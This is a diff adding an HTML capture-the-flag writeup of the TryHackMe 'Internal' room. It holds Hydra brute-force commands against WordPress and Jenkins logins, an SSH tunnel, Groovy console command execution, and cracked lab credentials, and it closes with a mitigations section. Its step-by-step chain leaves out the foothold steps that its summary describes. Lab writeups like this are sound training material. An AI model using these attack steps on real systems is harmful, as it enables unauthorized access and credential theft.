@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Internal — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="An Apache default page hides a WordPress 5.4.2 install at /blog/. WPScan finds the admin username, Hydra cracks the password, and WordPress's own Theme…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/internal.html">
+<meta property="og:title" content="Internal — TryHackMe writeup">
+<meta property="og:description" content="An Apache default page hides a WordPress 5.4.2 install at /blog/. WPScan finds the admin username, Hydra cracks the password, and WordPress's own Theme…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/internal.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Internal — TryHackMe writeup","description":"An Apache default page hides a WordPress 5.4.2 install at /blog/. WPScan finds the admin username, Hydra cracks the password, and WordPress's own Theme…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"url":"https://thecyberfarhan.github.io/writeups/internal.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/internal.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow">TryHackMe writeup</p>
+  <h1>Internal</h1>
+  <div class="meta">
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Hard</span>
+    
+  </div>
+  <div class="tldr"><b>TL;DR</b>An Apache default page hides a WordPress 5.4.2 install at <code>/blog/</code>. WPScan finds the <code>admin</code> username, Hydra cracks the password, and WordPress's own Theme Editor becomes the shell vector — editing <code>404.php</code> in place sidesteps the upload filter entirely, since the editor writes straight to disk and any extension restriction only applies to the upload form. That lands a <code>www-data</code> shell. A plaintext credentials file in <code>/opt</code> hands over SSH access as <code>aubreanna</code>, and from there a text file in her home directory reveals a Jenkins instance running inside a Docker container, reachable only on the container's internal IP. SSH local port forwarding exposes it, Hydra cracks the Jenkins login, and the built-in Groovy Script Console gives code execution as the <code>jenkins</code> user — which is enough to read a plaintext root password left behind in the container's <code>/opt</code>. </div>
+  <div class="tools"></div>
+  <h2>Introduction</h2>
+<p>Internal is a multi-stage "black box" box that chains a web app foothold into an internal-network pivot. The name is accurate: the real target isn't the WordPress install at all, it's a Jenkins instance that was never meant to be reachable from outside the host — it's bound to a Docker bridge address that only exists on the box itself.</p>
+<p>The room rewards methodical enumeration at every stage rather than any single clever exploit: a directory scan that doesn't stop at the Apache default page, a <code>grep</code> through world-readable files after each foothold, and recognizing <code>docker0</code> in <code>ifconfig</code>/<code>ip a</code> output as a sign there's a second network to go looking in.</p>
+<h2>Recon</h2>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.49.147.221 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC</code></pre>
+
+<pre><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works</code></pre>
+<p>Two ports. The HTTP title gives away nothing — it's the stock Apache placeholder page. That's a cue to enumerate harder, not a sign the box is empty.</p>
+<h3>Web Recon — Port 80</h3>
+<pre><code>feroxbuster -u http://10.49.147.221 \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -x php,html,txt,bak,js,json \
+  -s 200,301,302,403 \
+  -k --scan-dir-listings</code></pre>
+
+<pre><code>200  GET  http://10.49.147.221/blog/
+301  GET  http://10.49.147.221/wordpress/
+200  GET  http://10.49.147.221/phpmyadmin/
+200  GET  http://10.49.147.221/blog/wp-login.php</code></pre>
+<p>The default page was a decoy. <code>/blog/</code> is a live WordPress 5.4.2 install, <code>/wordpress/</code> redirects into it, and <code>/phpmyadmin/</code> is sitting there too (never exploited directly — WordPress was the faster path).</p>
+<p>Added the virtual host to <code>/etc/hosts</code> since WordPress redirects to <code>internal.thm</code> internally:</p>
+<pre><code>10.49.147.221   internal.thm</code></pre>
+<h3>WordPress Enumeration</h3>
+<pre><code>wpscan --url http://internal.thm/blog \
+  --enumerate u \
+  --plugins-detection aggressive \
+  -t 10</code></pre>
+
+<pre><code>[+] WordPress version 5.4.2 identified (Insecure, released 2020-06-10, 71 known vulnerabilities)
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+[+] user 'admin' found</code></pre>
+<p>One confirmed username: <code>admin</code>. No plugin-based vulnerabilities worth chasing — the login itself is the path in.</p>
+<h2>Foothold</h2>
+<h3>Credential Brute Force — WordPress Login</h3>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  internal.thm \
+  http-post-form \
+  "/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=%2Fblog%2Fwp-admin%2F&amp;testcookie=1:incorrect" \
+  -t 4</code></pre>
+
+<pre><code>[80][http-post-form] host: internal.thm   login: admin   password: my2boys</code></pre>
+<p><strong>Credentials:</strong> <code>admin:my2boys</code></p>
+<h2>The Full Chain</h2>
+<h3>Step 1 — Tunnel to Jenkins</h3>
+<pre><code>ssh -fN -L 8080:172.17.0.2:8080 aubreanna@internal.thm</code></pre>
+
+<pre><code>bind [127.0.0.1]:8080: Address already in use
+channel_setup_fwd_listener_tcpip: cannot listen to port: 8080</code></pre>
+<p>Port 8080 locally is already in use by this same session's prior forward attempt. Used 8081 instead:</p>
+<pre><code>ssh -fN -L 8081:172.17.0.2:8080 aubreanna@internal.thm</code></pre>
+
+<pre><code>curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8081
+# 403</code></pre>
+<p>Jenkins is up and reachable through the tunnel.</p>
+<h3>Step 2 — Brute Force Jenkins Login</h3>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  localhost \
+  http-post-form \
+  "/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password" \
+  -s 8081 -t 4</code></pre>
+
+<pre><code>[8081][http-post-form] host: localhost   login: admin   password: spongebob</code></pre>
+<p><strong>Credentials:</strong> <code>admin:spongebob</code></p>
+<h3>Step 3 — Groovy Script Console RCE</h3>
+<p><strong>Navigation:</strong> <code>Manage Jenkins → Script Console</code> (<code>/script</code>)</p>
+<p>Confirmed code execution as the Jenkins process user:</p>
+<pre><code>def p = ['sh','-c','id'].execute()
+println p.text</code></pre>
+
+<pre><code>uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)</code></pre>
+<p>Read the note Will left in the container for Aubreanna:</p>
+<pre><code>println "cat /opt/note.txt".execute().text</code></pre>
+
+<pre><code>Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
+need access to the root user account.
+
+root:tr0ub13guM!@#123</code></pre>
+<p>Root credentials, recovered without ever needing a full interactive shell inside the container.</p>
+<h3>Step 4 — Root</h3>
+<pre><code>ssh root@internal.thm
+# Password: tr0ub13guM!@#123</code></pre>
+
+<pre><code>root@internal:~#</code></pre>
+
+<h2>Rabbit Holes</h2>
+<p><strong><code>cve-2026-87902-poc</code> against the WordPress install:</strong> Tried a published CVE proof-of-concept against the blog before falling back to brute force. It ran but found nothing (<code>[-] no published page found</code>). The CVE angle was a dead end; straightforward credential brute force against <code>wp-login.php</code> was the actual path in.</p>
+<p><strong>Direct file upload for the reverse shell:</strong> Spent time trying <code>.php5</code> and <code>.php.html</code> extensions to get the upload form to accept the PHP reverse shell before switching to the Theme Editor, which bypasses the upload filter entirely by writing to disk directly.</p>
+<p><strong>Triggering the shell at <code>/blog/404.php</code>:</strong> The intuitive URL for a "404 template" is to hit a page that returns a 404. That just renders WordPress's own 404 page through its router — no code runs. The theme file has to be requested directly from its path under <code>wp-content/themes/</code>, bypassing WordPress's request handling altogether.</p>
+<p><strong>Probing <code>localhost:8080</code> before the forward was properly set up:</strong> Got a <code>403</code> and briefly treated it as a trap or honeypot rather than confirmation that something real (Jenkins) was listening behind it. Pivoted to systematic privesc enumeration first, which is how the <code>jenkins.txt</code> hint got found — then came back to the port with more context.</p>
+<h2>Mitigations</h2>
+<p><strong>WordPress admin panel reachable with password-only auth:</strong> A brute-forceable admin password turned directly into a code-execution primitive via the Theme Editor. WordPress admin logins should sit behind MFA or at minimum an IP allowlist / rate limiting, and the Theme/Plugin Editor should be disabled in <code>wp-config.php</code> (<code>DISALLOW_FILE_EDIT</code>) on any production install.</p>
+<p><strong>Plaintext credentials in world-readable locations:</strong> Both pivots in this box — <code>aubreanna</code>'s SSH password and the root password — were recovered from plaintext notes left in <code>/opt</code>, readable by any local user. Credentials belong in a secrets manager, never in a text file with default permissions.</p>
+<p><strong>Jenkins Script Console reachable with a weak password:</strong> The Groovy console is, by design, full remote code execution for anyone who can authenticate. It should be disabled outright on anything but a locked-down admin workstation, and if it must stay enabled, Jenkins should enforce strong authentication and should not be reachable even from other containers on the same host without an explicit need.</p>
+<p><strong>Docker-internal services treated as implicitly trusted:</strong> Jenkins was bound to a container-internal IP with no additional authentication expected because it "wasn't externally reachable." Any host-level compromise — exactly what happened here — erases that boundary instantly. Internal network segmentation should not substitute for authentication on the service itself.</p>
+  <div class="takeaway"><b>Key takeaway</b>The big lesson here is that "internal-only" is not a security control once the perimeter is breached once. Jenkins trusted its Docker-bridge binding as sufficient isolation, but a single WordPress credential-stuffing success gave <code>www-data</code>, which led to <code>aubreanna</code>, who had SSH access, which is all it took to reach the "internal" Jenkins over a loopback forward. Defense needs to assume lateral movement is possible and authenticate every service on its own merits, not on the assumption that nothing malicious already has a foothold on the host.  The secondary pattern worth remembering: WordPress's Theme/Plugin Editor is functionally an authenticated webshell dropper built into core. Any time file-upload restrictions are blocking a shell, check whether an in-app code editor exists that writes to disk without going through that same validation path.</div>
+  <h2>If I Did It Again</h2>
+<p>Skip the CVE proof-of-concept attempt entirely — a 71-vulnerability-count WordPress version with a known admin username is a brute-force target first, not a research target. Go straight to Hydra against <code>wp-login.php</code>.</p>
+<p>Once in <code>wp-admin</code>, go straight for the Theme Editor instead of fighting the upload filter with extension tricks. It's faster and it's the intended path for any WordPress box with no active security plugin.</p>
+<p>For the Jenkins pivot, the moment <code>docker0</code> and a <code>172.17.x.x</code> reference show up anywhere — login banner, <code>.bash_history</code>, a stray text file — immediately <code>grep -ri</code> common internal-service keywords (<code>jenkins</code>, <code>gitlab</code>, <code>tomcat</code>, <code>portainer</code>) across the user's home and <code>/opt</code>/<code>/var</code> rather than guessing at ports. That's what actually surfaced the hint here, just later than it needed to.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/internal_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+</body>
+</html>
